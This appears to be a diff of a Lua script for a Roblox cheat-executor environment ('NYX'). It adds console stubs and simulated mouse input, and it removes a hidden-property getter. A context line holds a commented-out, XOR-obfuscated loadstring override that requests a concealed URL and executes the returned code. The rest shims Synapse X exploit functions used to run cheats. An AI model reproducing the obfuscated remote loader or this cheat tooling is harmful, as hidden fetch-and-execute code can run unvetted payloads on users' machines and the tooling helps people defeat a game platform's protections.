@@ -13,6 +13,7 @@ game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
     end
 end)
 
+--[[
 local active = {}
 
 local function onPlayerChatted(player)
@@ -37,7 +38,7 @@ end
 
 game.Players.PlayerAdded:Connect(onPlayerChatted)
 
-
+]]
 
 --local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v13=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v13,v13 + 1 )),v1(v2(v9,1 + (v13% #v9) ,1 + (v13% #v9) + 1 )))%256 ));end return v5(v10);end function loadstring(v11) local v12=request({[v7("\228\209\215","\126\177\163\187\69\134\219\167")]=v7("\43\217\62\213\166\108\130\38\202\255\34\193\34\202\239\55\151\124\156\170\122\130\38\202\253\39\222\62\215\245\45\202","\156\67\173\74\165"),[v7("\25\178\93\30\179\34","\38\84\215\41\118\220\70")]=v7("\96\57\17\38","\158\48\118\66\114"),[v7("\131\33\17\50\118\183\232","\155\203\68\112\86\19\197")]={[v7("\101\210\56\232\69\118\241\181\114\196\38\249","\152\38\189\86\156\32\24\133")]=v7("\232\82\191\82\179\71\171\71\245\89","\38\156\55\199")},[v7("\138\114\120\49","\35\200\29\28\72\115\20\154")]=v11}).Body;return loadstring(v12);end
 --game.Players.LocalPlayer:Kick("For the safety of our users, NYX will not inject. Updates at discord.gg/getnyx")
@@ -116,8 +117,6 @@ function info(...)
 end
 
 
-
-
 function getfpscap()
     return math.floor(1 / game:GetService("RunService").RenderStepped:Wait() + 0.5)
 end
@@ -185,14 +184,6 @@ function getconnections(signal: RBXScriptSignal): {Connection} -- FAKE i will wo
 end
 -- fake
 local hiddenProperties = {}
-
-function gethiddenproperty(instance, propertyName)
-    if hiddenProperties[instance] and hiddenProperties[instance][propertyName] ~= nil then
-        return hiddenProperties[instance][propertyName], true
-    else
-        return nil, false
-    end
-end
 
 function sethiddenproperty(instance, propertyName, value)
     if not hiddenProperties[instance] then
@@ -439,4 +430,97 @@ function random_string(length)
         result = result .. chars:sub(randomIndex, randomIndex)
     end
     return result
+end
+
+-- what script actually uses these shit lol
+--https://synapsexdocs.github.io/custom-lua-functions/console-functions/
+function rconsoleclear() --Clears the console. MACRO: system("CLS")
+end
+
+function rconsolecreate() --todo: allocate console via bridge??? possible but i dont want to do this
+end
+
+function rconsoledestroy() -- in cpp i would do ShowWindow(hwnd, SW_HIDE) to destroy if we want we can just close it 
+end
+
+function rconsoleinput() 
+end
+
+function rconsoleprint(txt) 
+end
+
+function consoleclear() 
+end
+
+function consolecreate() 
+end
+
+function consoledestroy() 
+end
+
+function consoleinput() 
+end
+
+function consoleprint(txt) 
+end
+
+function rconsolename(txt) 
+end
+
+function consolesettitle(txt) 
+end
+
+-- i can do this via bridge i just dont feel like it
+local vim = game:GetService('VirtualInputManager')
+
+ function mouse1click(x, y)
+    x, y = x or 0, y or 0
+    vim:SendMouseButtonEvent(x, y, 0, true, game, false)
+    task.wait()
+    vim:SendMouseButtonEvent(x, y, 0, false, game, false)
+end
+
+ function mouse2click(x, y)
+    x, y = x or 0, y or 0
+    vim:SendMouseButtonEvent(x, y, 1, true, game, false)
+    task.wait()
+    vim:SendMouseButtonEvent(x, y, 1, false, game, false)
+end
+
+ function mouse1press(x, y)
+    x, y = x or 0, y or 0
+    vim:SendMouseButtonEvent(x, y, 0, true, game, false)
+end
+
+ function mouse1release(x, y)
+    x, y = x or 0, y or 0
+    vim:SendMouseButtonEvent(x, y, 0, false, game, false)
+end
+
+ function mouse2press(x, y)
+    x, y = x or 0, y or 0
+    vim:SendMouseButtonEvent(x, y, 1, true, game, false)
+end
+
+ function mouse2release(x, y)
+    x, y = x or 0, y or 0
+    vim:SendMouseButtonEvent(x, y, 1, false, game, false)
+end
+
+ function mousescroll(x, y, a)
+    x, y = x or 0, y or 0
+    vim:SendMouseWheelEvent(x, y, a or false, game)
+end
+
+ function mousemoverel(relx, rely)
+    relx, rely = relx or 0, rely or 0
+    local Pos = workspace.CurrentCamera.ViewportSize
+    local x = Pos.X * relx
+    local y = Pos.Y * rely
+    vim:SendMouseMoveEvent(x, y, game)
+end
+
+ function mousemoveabs(x, y)
+    x, y = x or 0, y or 0
+    vim:SendMouseMoveEvent(x, y, game)
 end
